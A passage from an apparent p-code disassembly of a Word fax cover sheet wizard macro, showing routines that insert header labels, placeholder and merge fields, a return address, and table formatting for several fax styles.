' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1026:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer2 
' Line #1027:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1028:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1029:
' Line #1030:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_PAGES 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #1031:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraphAfter 0x0000 
' Line #1032:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1033:
' 	QuoteRem 0x0004 0x001E "set character style for topics"
' Line #1034:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1035:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer2 
' 	MemSt Style 
' Line #1036:
' Line #1037:
' 	QuoteRem 0x0004 0x000A "Insert Re:"
' Line #1038:
' 	Ld strRE 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1039:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #1040:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1041:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1042:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_SUBJECT 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #1043:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1044:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1045:
' Line #1046:
' 	QuoteRem 0x0004 0x000A "Insert CC:"
' Line #1047:
' 	Ld strCC 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1048:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer2 
' Line #1049:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1050:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1051:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_NAME 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #1052:
' Line #1053:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1054:
' 	QuoteRem 0x0004 0x001E "set character style for topics"
' Line #1055:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1056:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer2 
' 	MemSt Style 
' Line #1057:
' Line #1058:
' 	QuoteRem 0x0004 0x001D "convert the text into a table"
' Line #1059:
' 	Ld objActiveRange 
' 	MemLd End 
' 	Ld objRngTextTable 
' 	MemSt End 
' Line #1060:
' 	Ld objRngTextTable 
' 	ArgsMemCall Set 0x0000 
' Line #1061:
' 	SetStmt 
' 	Ld vbTab 
' 	LitDI2 0x0004 
' 	LitDI2 0x0004 
' 	LitVarSpecial (True)
' 	ParamNamed AutoFit 
' 	LitDI2 0x0000 
' 	ParamNamed Format$ 
' 	Ld Selection 
' 	ArgsMemLd ConvertToTable 0x0005 
' 	Set objTable 
' Line #1062:
' 	StartWithExpr 
' 	Ld objTable 
' 	With 
' Line #1063:
' 	LitVarSpecial (False)
' 	MemLdWith Borders 
' 	MemSt Enable 
' Line #1064:
' 	LitDI2 0x0000 
' 	MemLdWith Rows 
' 	MemSt SpaceBetweenColumns 
' Line #1065:
' 	Ld iFaxStyle 
' 	Ld iSTY_CONTEMPORARY 
' 	Eq 
' 	IfBlock 
' Line #1066:
' 	Ld sCONT_LEFT_INDENT 
' 	MemLdWith Rows 
' 	MemSt LeftIndent 
' Line #1067:
' 	ElseBlock 
' 	QuoteRem 0x000D 0x0017 "for professional style."
' Line #1068:
' 	QuoteRem 0x0008 0x0034 "contemporary has autotext entry to insert the lines."
' Line #1069:
' 	Ld Selection 
' 	MemLd Cells 
' 	ArgsMemCall AutoFit 0x0000 
' Line #1070:
' 	Ld sCONT_WIDTH_COL1 
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Columns 0x0001 
' 	MemSt With 
' Line #1071:
' 	Ld sCONT_WIDTH_COL1 
' 	LitDI2 0x0004 
' 	ArgsMemLdWith Columns 0x0001 
' 	MemSt With 
' Line #1072:
' 	LitVarSpecial (True)
' 	Ld wdBorderHorizontal 
' 	MemLdWith Rows 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt Visible 
' Line #1073:
' 	LitVarSpecial (True)
' 	Ld wdBorderBottom 
' 	ArgsMemLdWith Borders 0x0001 
' 	MemSt Visible 
' Line #1074:
' 	EndIfBlock 
' Line #1075:
' 	EndWith 
' Line #1076:
' 	QuoteRem 0x0004 0x0030 "convert to table inserts a vbCr after the table."
' Line #1077:
' 	ArgsCall InsertCheckBoxes 0x0000 
' Line #1078:
' 	ArgsCall InsertBodyText 0x0000 
' Line #1079:
' Line #1080:
' 	Ld iFaxStyle 
' 	Ld iSTY_CONTEMPORARY 
' 	Eq 
' 	IfBlock 
' Line #1081:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Set objActiveRange 
' Line #1082:
' 	Ld wdCollapseStart 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1083:
' 	QuoteRem 0x0008 0x000C "Insert title"
' Line #1084:
' 	Ld strSTY_DOC_LABEL 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1085:
' 	Ld iFaxStyle 
' 	ArgsLd rgstrFaxTitle 0x0001 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' 	QuoteRem 0x003D 0x0007 " & vbCr"
' Line #1086:
' 	QuoteRem 0x0004 0x0029 "    objActiveRange.Collapse wdCollapseEnd"
' Line #1087:
' 	EndIfBlock 
' Line #1088:
' 	ExitSub 
' Line #1089:
' 	Label FatalError 
' Line #1090:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1091:
' 	EndSub 
' Line #1092:
' 	QuoteRem 0x0000 0x0024 "creates an elegant style cover sheet"
' Line #1093:
' 	FuncDefn (Private Sub CreateElegCoverSheet())
' Line #1094:
' 	Dim 
' 	VarDefn objRngBuffer1 (As Range)
' Line #1095:
' 	Dim 
' 	VarDefn objRngBuffer2 (As Range)
' Line #1096:
' 	Dim 
' 	VarDefn strCmpnyName (As String)
' 	VarDefn strName (As String)
' Line #1097:
' 	Dim 
' 	VarDefn strMFFirstName (As String)
' 	VarDefn strMFLastName (As String)
' 	VarDefn strMFFaxNum (As String)
' Line #1098:
' 	Dim 
' 	VarDefn objRngTextTable (As Range)
' Line #1099:
' 	Dim 
' 	VarDefn objTable (As Table)
' 	VarDefn objRow (As Row)
' Line #1100:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #1101:
' Line #1102:
' 	OnError FatalError 
' Line #1103:
' Line #1104:
' 	ArgsCall InsertReturnAddress 0x0000 
' Line #1105:
' Line #1106:
' 	Ld strMFFirstName 
' 	Ld strMFLastName 
' 	Ld strMFFaxNum 
' 	ArgsCall GetMergeFieldNames 0x0003 
' Line #1107:
' Line #1108:
' 	QuoteRem 0x0004 0x0013 "Insert company name"
' Line #1109:
' 	Ld formWizard 
' 	MemLd txtCompany 
' 	MemLd Then 
' 	St strCmpnyName 
' Line #1110:
' 	Ld strCmpnyName 
' 	FnLen 
' 	Paren 
' 	IfBlock 
' Line #1111:
' 	Ld strSTY_COMPANY_NAME 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1112:
' 	Ld strCmpnyName 
' 	Ld vbCr 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1113:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1114:
' 	EndIfBlock 
' Line #1115:
' Line #1116:
' 	QuoteRem 0x0004 0x000C "Insert title"
' Line #1117:
' 	Ld strSTY_DOC_LABEL 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1118:
' 	Ld iFaxStyle 
' 	ArgsLd rgstrFaxTitle 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1119:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1120:
' Line #1121:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngTextTable 
' Line #1122:
' Line #1123:
' 	QuoteRem 0x0000 0x003F "the topics To: and From: have a character style which has to be"
' Line #1124:
' 	QuoteRem 0x0000 0x003E "applied after the data has been written (since the data have a"
' Line #1125:
' 	QuoteRem 0x0000 0x0028 "different style). so, use a range buffer"
' Line #1126:
' Line #1127:
' 	QuoteRem 0x0004 0x003E "1st line text has style "Message Header First". The subsequent"
' Line #1128:
' 	QuoteRem 0x0004 0x001B "lines have "Message Header""
' Line #1129:
' Line #1130:
' 	QuoteRem 0x0004 0x0012 "Insert To: & From:"
' Line #1131:
' 	Ld strSTY_MSG_HDR_FIRST 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1132:
' Line #1133:
' 	Ld strTO 
' 	Ld vbTab 
' 	Concat 
' 	Ld strFROM 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1134:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #1135:
' 	Ld strSOFT_ENTER 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1136:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1137:
' 	QuoteRem 0x0004 0x002B "Insert textual information in the next line"
' Line #1138:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	Ld fDocIsFormLtr 
' 	Or 
' 	IfBlock 
' Line #1139:
' 	Ld objActiveRange 
' 	Ld wdFieldMergeField 
' 	Ld strMFFirstName 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' 	QuoteRem 0x004C 0x0012 "Preserveformatting"
' Line #1140:
' 	Ld strMFLastName 
' 	FnLen 
' 	IfBlock 
' Line #1141:
' 	Ld strSPACE 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1142:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1143:
' 	Ld objActiveRange 
' 	Ld wdFieldMergeField 
' 	Ld strMFLastName 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' Line #1144:
' 	EndIfBlock 
' Line #1145:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Eq 
' 	ElseIfBlock 
' Line #1146:
' 	LitDI2 0x0000 
' 	ArgsLd rgstrRcpntFaxNames 0x0001 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1147:
' 	ElseBlock 
' Line #1148:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_NAME 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #1149:
' 	EndIfBlock 
' Line #1150:
' Line #1151:
' 	QuoteRem 0x0004 0x000B "insert name"
' Line #1152:
' 	Ld formWizard 
' 	MemLd txtSenderName 
' 	MemLd Then 
' 	St strName 
' Line #1153:
' 	Ld strName 
' 	FnLen 
' 	IfBlock 
' Line #1154:
' 	Ld vbTab 
' 	Ld strName 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1155:
' 	ElseBlock 
' Line #1156:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1157:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1158:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_NAME 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #1159:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraphAfter 0x0000 
' Line #1160:
' 	EndIfBlock 
' Line #1161:
' Line #1162:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1163:
' 	QuoteRem 0x0004 0x001E "set character style for topics"
' Line #1164:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1165:
' Line #1166:
' 	QuoteRem 0x0004 0x0026 "next 3 lines in "Message Header" style"
' Line #1167:
' 	QuoteRem 0x0004 0x0019 "Insert FaxNumber and Date"
' Line #1168:
' 	Ld wdStyleMessageHeader 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1169:
' Line #1170:
' 	Ld strFAX_NUMBER 
' 	Ld vbTab 
' 	Concat 
' 	Ld strDATE 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1171:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #1172:
' 	Ld strSOFT_ENTER 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1173:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1174:
' 	QuoteRem 0x0004 0x002B "Insert textual information in the next line"
' Line #1175:
' Line #1176:
' 	QuoteRem 0x0004 0x0017 "insert recipient number"
' Line #1177:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	Ld fDocIsFormLtr 
' 	Or 
' 	IfBlock 
' Line #1178:
' 	Ld objActiveRange 
' 	Ld wdFieldMergeField 
' 	Ld strMFFaxNum 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' 	QuoteRem 0x0049 0x0012 "Preserveformatting"
' Line #1179:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Eq 
' 	ElseIfBlock 
' Line #1180:
' 	LitDI2 0x0000 
' 	ArgsLd rgstrRcpntFaxNums 0x0001 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1181:
' 	ElseBlock 
' Line #1182:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_FAX_NUMBER 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' Line #1183:
' 	EndIfBlock 
' Line #1184:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1185:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1186:
' Line #1187:
' 	QuoteRem 0x0004 0x0010 "insert datefield"
' Line #1188:
' 	Ld objActiveRange 
' 	Ld wdFieldTime 
' 	LitStr 0x0003 "\@ "
' 	Ld strQUOTE 
' 	Concat 
' 	Ld strDATE_FORMAT 
' 	Concat 
' 	Ld strQUOTE 
' 	Concat 
' 	LitVarSpecial (True)
' 	ArgsCall InsertField 0x0004 
' Line #1189:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraphAfter 0x0000 
' Line #1190:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1191:
' 	QuoteRem 0x0004 0x001E "set character style for topics"
' Line #1192:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1193:
' Line #1194:
' 	QuoteRem 0x0004 0x001A "Insert CompanyName & Pages"
' Line #1195:
' 	Ld strCOMPANY 
' 	Ld vbTab 
' 	Concat 
' 	Ld strTOTAL_NO_PAGES 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1196:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #1197:
' 	Ld strSOFT_ENTER 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1198:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1199:
' 	QuoteRem 0x0004 0x0013 "Insert company name"
' Line #1200:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_COMPANY 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' 	QuoteRem 0x0062 0x0012 "PreserveFormatting"
' Line #1201:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1202:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1203:
' Line #1204:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_PAGES 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' 	QuoteRem 0x0060 0x0012 "PreserveFormatting"
' Line #1205:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraphAfter 0x0000 
' Line #1206:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1207:
' Line #1208:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1209:
' Line #1210:
' 	QuoteRem 0x0004 0x0012 "Phone Number & Re:"
' Line #1211:
' 	Ld strPHONE_NUMBER 
' 	Ld vbTab 
' 	Concat 
' 	Ld strRE 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1212:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set objRngBuffer1 
' Line #1213:
' 	Ld strSOFT_ENTER 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1214:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1215:
' Line #1216:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_PHONE_NUMBER 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' 	QuoteRem 0x0067 0x0012 "PreserveFormatting"
' Line #1217:
' 	Ld vbTab 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1218:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1219:
' Line #1220:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_SUBJECT 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' 	QuoteRem 0x0062 0x0012 "PreserveFormatting"
' Line #1221:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraphAfter 0x0000 
' Line #1222:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1223:
' Line #1224:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1225:
' Line #1226:
' 	QuoteRem 0x0004 0x001E "set character style for topics"
' Line #1227:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld objRngBuffer1 
' 	MemSt Style 
' Line #1228:
' Line #1229:
' 	QuoteRem 0x0004 0x001D "convert the text into a table"
' Line #1230:
' 	Ld objActiveRange 
' 	MemLd End 
' 	Ld objRngTextTable 
' 	MemSt End 
' 	QuoteRem 0x002D 0x001B "- 1 'don't want the last CR"
' Line #1231:
' 	Ld objRngTextTable 
' 	ArgsMemCall Set 0x0000 
' Line #1232:
' 	SetStmt 
' 	Ld vbTab 
' 	LitDI2 0x000A 
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	ParamNamed Format$ 
' 	Ld Selection 
' 	ArgsMemLd ConvertToTable 0x0004 
' 	Set objTable 
' Line #1233:
' 	LitVarSpecial (False)
' 	Ld objTable 
' 	MemLd Borders 
' 	MemSt Enable 
' Line #1234:
' Line #1235:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0008 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #1236:
' 	SetStmt 
' 	Ld i 
' 	Ld objTable 
' 	ArgsMemLd Rows 0x0001 
' 	Set objRow 
' Line #1237:
' 	LitR8 0x0000 0x0000 0x0000 0x3FD0 
' 	LitDI2 0x0048 
' 	Mul 
' 	Ld objRow 
' 	MemLd Range 
' 	MemLd ParagraphFormat 
' 	MemSt LeftIndent 
' Line #1238:
' 	QuoteRem 0x0008 0x002E "don't need the bottom border for the last row."
' Line #1239:
' 	Ld i 
' 	LitDI2 0x0008 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld wdBorderBottom 
' 	Ld objRow 
' 	ArgsMemSt Borders 0x0001 
' 	EndIf 
' Line #1240:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #1241:
' Line #1242:
' 	ArgsCall InsertCheckBoxes 0x0000 
' Line #1243:
' 	ArgsCall InsertBodyText 0x0000 
' Line #1244:
' Line #1245:
' 	ExitSub 
' Line #1246:
' 	Label FatalError 
' Line #1247:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1248:
' 	EndSub 
' Line #1249:
' Line #1250:
' 	QuoteRem 0x0000 0x0043 "Get the names of the merge fields to be inserted in the cover sheet"
' Line #1251:
' 	QuoteRem 0x0000 0x004D "If the original doc. is a form letter then we need to insert the merge fields"
' Line #1252:
' 	QuoteRem 0x0000 0x0050 "selected by the user. If not then insert the merge field names we created in the"
' Line #1253:
' 	QuoteRem 0x0000 0x0016 "data source we created"
' Line #1254:
' 	FuncDefn (Private Sub GetMergeFieldNames(strFirstName As String, strLastName As String, strFaxNum As String))
' Line #1255:
' 	OnError FatalError 
' Line #1256:
' Line #1257:
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	IfBlock 
' Line #1258:
' 	QuoteRem 0x0008 0x004C "user selects names from drop-down of all possible mergefields in data source"
' Line #1259:
' 	Ld formWizard 
' 	MemLd cboFldsRcpntFirstName 
' 	MemLd Then 
' 	St strFirstName 
' Line #1260:
' 	Ld formWizard 
' 	MemLd cboFldsRcpntLastName 
' 	MemLd Then 
' 	St strLastName 
' Line #1261:
' 	Ld strLastName 
' 	Ld strNONE 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St strLastName 
' 	EndIf 
' Line #1262:
' 	Ld formWizard 
' 	MemLd cboFldsFaxNum 
' 	MemLd Then 
' 	St strFaxNum 
' Line #1263:
' 	ElseBlock 
' Line #1264:
' 	Ld strFLD_FAX_NAME 
' 	St strFirstName 
' Line #1265:
' 	LitStr 0x0000 ""
' 	St strLastName 
' Line #1266:
' 	Ld strFLD_FAX_NUMBER 
' 	St strFaxNum 
' Line #1267:
' 	EndIfBlock 
' Line #1268:
' Line #1269:
' 	ExitSub 
' Line #1270:
' 	Label FatalError 
' Line #1271:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1272:
' 	EndSub 
' Line #1273:
' 	FuncDefn (Private Sub InsertReturnAddress())
' Line #1274:
' 	Dim 
' 	VarDefn strFromPh (As String)
' Line #1275:
' 	Dim 
' 	VarDefn strFromFax (As String)
' Line #1276:
' 	Dim 
' 	VarDefn strText (As String)
' 	VarDefn strAddress (As String)
' Line #1277:
' Line #1278:
' 	OnError FatalError 
' Line #1279:
' Line #1280:
' 	QuoteRem 0x0004 0x002B "Set objActiveRange = ActiveDocument.Content"
' Line #1281:
' 	QuoteRem 0x0004 0x004B "If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd"
' Line #1282:
' Line #1283:
' 	Ld formWizard 
' 	MemLd txtSenderPhone 
' 	MemLd Then 
' 	St strFromPh 
' Line #1284:
' 	Ld formWizard 
' 	MemLd txtSenderFax 
' 	MemLd Then 
' 	St strFromFax 
' Line #1285:
' 	Ld formWizard 
' 	MemLd txtMailingAddr 
' 	MemLd Then 
' 	St strAddress 
' Line #1286:
' Line #1287:
' 	Ld iFaxStyle 
' 	SelectCase 
' Line #1288:
' Line #1289:
' 	Ld iSTY_CONTEMPORARY 
' 	Case 
' 	Ld iSTY_PROFESSIONAL 
' 	Case 
' 	CaseDone 
' Line #1290:
' 	Ld strAddress 
' 	St strText 
' Line #1291:
' 	Ld strText 
' 	FnLen 
' 	If 
' 	BoSImplicit 
' 	Ld strText 
' 	Ld vbCr 
' 	Concat 
' 	St strText 
' 	EndIf 
' Line #1292:
' 	LineCont 0x0004 08 00 0C 00
' 	Ld strFromPh 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld strText 
' 	Ld strPHONE 
' 	Concat 
' 	Ld strSPACE 
' 	Concat 
' 	Ld strFromPh 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St strText 
' 	EndIf 
' Line #1293:
' Line #1294:
' 	LineCont 0x0004 08 00 0C 00
' 	Ld strFromFax 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld strText 
' 	Ld strFAX 
' 	Concat 
' 	Ld strSPACE 
' 	Concat 
' 	Ld strFromFax 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St strText 
' 	EndIf 
' Line #1295:
' 	Ld strText 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld strText 
' 	Ld vbCr 
' 	Concat 
' 	St strText 
' 	EndIf 
' Line #1296:
' 	Ld iSTY_ELEGANT 
' 	Case 
' 	CaseDone 
' Line #1297:
' 	Ld strAddress 
' 	Ld strSPACE 
' 	Ld strBULLET 
' 	Concat 
' 	Ld strSPACE 
' 	Concat 
' 	ArgsLd StrReplaceCrLfWithText 0x0002 
' 	St strText 
' Line #1298:
' 	Ld strText 
' 	FnLen 
' 	If 
' 	BoSImplicit 
' 	Ld strText 
' 	Ld vbCr 
' 	Concat 
' 	St strText 
' 	EndIf 
' Line #1299:
' 	QuoteRem 0x0008 0x0018 "if you have phone number"
' Line #1300:
' 	Ld strFromPh 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #1301:
' 	Ld strText 
' 	Ld strPHONE 
' 	Concat 
' 	Ld strSPACE 
' 	Concat 
' 	Ld strFromPh 
' 	Concat 
' 	St strText 
' Line #1302:
' 	QuoteRem 0x000C 0x001A "check if you also have fax"
' Line #1303:
' 	QuoteRem 0x000C 0x0034 "instead of vbCr use space, bullet, space combination"
' Line #1304:
' 	LineCont 0x0004 08 00 10 00
' 	Ld strFromFax 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld strText 
' 	Ld strSPACE 
' 	Concat 
' 	Ld strBULLET 
' 	Concat 
' 	Ld strSPACE 
' 	Concat 
' 	Ld strFAX 
' 	Concat 
' 	Ld strSPACE 
' 	Concat 
' 	Ld strFromFax 
' 	Concat 
' 	St strText 
' 	EndIf 
' Line #1305:
' 	Ld strText 
' 	Ld vbCr 
' 	Concat 
' 	St strText 
' Line #1306:
' 	QuoteRem 0x0008 0x001A "check if you have only Fax"
' Line #1307:
' 	Ld strFromFax 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	ElseIfBlock 
' Line #1308:
' 	Ld strText 
' 	Ld strFAX 
' 	Concat 
' 	Ld strSPACE 
' 	Concat 
' 	Ld strFromFax 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St strText 
' Line #1309:
' 	EndIfBlock 
' Line #1310:
' Line #1311:
' 	EndSelect 
' Line #1312:
' Line #1313:
' 	Ld strSTY_RETURN_ADDR 
' 	Ld objActiveRange 
' 	MemSt Style 
